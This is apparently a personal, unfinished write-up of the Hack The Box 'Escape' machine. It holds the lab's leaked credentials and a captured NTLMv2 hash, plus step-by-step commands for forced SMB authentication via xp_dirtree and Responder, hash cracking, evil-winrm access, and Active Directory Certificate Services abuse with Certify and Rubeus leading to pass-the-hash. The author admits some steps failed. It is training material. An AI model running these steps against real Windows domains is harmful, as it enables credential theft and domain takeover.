


```powershell
'This room was too advanced for me. I tried it on 11th Dec 2025 and even following guides I couldnt do it. I try again later. 
```

https://www.youtube.com/watch?v=PS2duvVcjws&t=693s


# Host Discovery

![[Pasted image 20251130124131.png]]

Host is up. 

# Port Scanning


![[Pasted image 20251130124314.png]]


# enum4linux


NetBIOS computer name: DC
NetBIOS domain name: sequel
DNS domain: sequel.htb
FQDN: dc.sequel.htb
Derived membership: domain member
Derived domain: sequel


# /etc/hosts



# Userlist 

Ryan
Tom
Brandon


# Creds

 > *SQL Server Authentication found from a pdf file downloaded from SMB Public share .* 
 > 
	PublicUser  -  GuestUserCantWrite1


> SQL_SVC - REGGIE1234ronnie  (Cracked NTLMV2 Hash)

> sequel.htb\Ryan.Cooper - NuclearMosquito3 (found in C:\SQLServer\Logs )

# Holes (foothold)

```powershell

smbclient //target/Public - U 'Username%' # this share leaks the creds
nxc mssql --local-auth target -u 'PublicUser' -p 'GuestUserCantWrite1' #shows that this user can auth to mssql
impacket-mssqlclient PublicUser:GuestUserCantWrite1@target # authenticate to the mssql


# capture NTLMV2 hash
sudo responder -I tun0
xp_dirtree \\10.10.15.20\fake\share 


#  hashcat.exe hashes/escape.ntlmv2 rockyou.txt

SQL_SVC::sequel:3b6d74e811cb6425:2ed9e19db811ad915792f2515d132042:0101000000000000802719d67b64dc016188cb79ce9993f000000000020008004800390042004e0001001e00570049004e002d005200340042004100470048003800390046003000440004003400570049004e002d00520034004200410047004800380039004600300044002e004800390042004e002e004c004f00430041004c00030014004800390042004e002e004c004f00430041004c00050014004800390042004e002e004c004f00430041004c0007000800802719d67b64dc010600040002000000080030003000000000000000000000000030000019d068ea9f362c9dc5cc5043c353c57bbac9dce0cfe4b3e236580096e89685190a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00320030000000000000000000:REGGIE1234ronnie


# access the windows 
evil-winrm -i target -u SQL_SVC -p REGGIE1234ronnie


# Basically this should give me the NTLM hash, but I couldn't get it. 
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap

# If we have the NTLM hash, we can use psexec to login 
psexec.py -hashes LM:NTLM administrator:10.10.11.202

# see the photo below. Since LM hash is not used, the guide repeated NTLM hash twice.
```

![[Pasted image 20251203222703.png]]
# Priv Esc

```powershell

# login with Ryan Cooper acc
evil-winrm -i target -u Ryan.Cooper -p NuclearMosquito3

# Upload Certify.exe with evil-winrm upload
upload ./Escape/Certify.exe .

# Enum Active Directory Certificate Services
 .\Certify.exe find /vulnerable

# Request the Cert
 .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
 
# Copy the keys into a cert.pem

# Convert the cert.pem to cert.pfx
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 
 
# Upload Rubeus and cert.pfx to the target
(host) cp /usr/share/windows-resources/rubeus/Rubeus.exe ~/HTB/Escape

(Target)  upload ./Escape/Rubeus.exe .
(Target)  upload ./Escape/cert.pfx .

# Run Rubeus
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx

#...

# This should give NTLM hash but I somwhow I couldn't do it. 
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap
```

```powershell
openssl s_client -showcerts -connect 10.129.22.97:3269
openssl s_client -showcerts -connect 10.129.22.97:3269 | openssl x509 -noout -text
```
# TODO

How to view certificates? 
